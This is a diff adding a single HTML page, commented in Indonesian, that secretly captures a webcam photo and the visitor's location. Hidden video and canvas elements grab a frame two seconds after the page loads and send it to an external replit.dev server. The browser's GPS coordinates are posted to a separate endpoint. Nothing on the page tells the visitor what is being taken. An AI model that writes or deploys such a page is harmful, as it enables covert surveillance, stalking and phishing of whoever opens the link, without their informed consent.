@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Capture Image and Send Location</title>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Akses kamera dan mulai stream
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+            })
+            .catch(function(err) {
+                console.error('Error accessing camera: ' + err);
+            });
+
+        // Fungsi untuk mengambil foto dan mengirimnya ke server
+        function captureAndSendImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const dataUrl = canvas.toDataURL('image/png');
+
+            // Kirim gambar ke server
+            fetch('https://d2be8342-cb69-484c-88bd-4dee8f64a6ee-00-216c5jobeq40j.worf.replit.dev/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'image=' + encodeURIComponent(dataUrl)
+            }).then(response => {
+                alert('Foto berhasil diambil dan dikirim!');
+            });
+        }
+
+        // Fungsi untuk mendapatkan lokasi dan mengirimkan ke server
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Kirim lokasi ke server
+                    fetch('/receive-location', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            latitude: latitude,
+                            longitude: longitude
+                        })
+                    }).then(response => {
+                        alert('Lokasi berhasil dikirim!');
+                    });
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Menambahkan tombol untuk mengambil foto dan mengirim lokasi
+        setTimeout(function() {
+            captureAndSendImage();  // Ambil foto otomatis setelah 2 detik
+            sendLocation();         // Kirim lokasi setelah mendapatkan data
+        }, 2000);
+    </script>
+</body>
+</html>
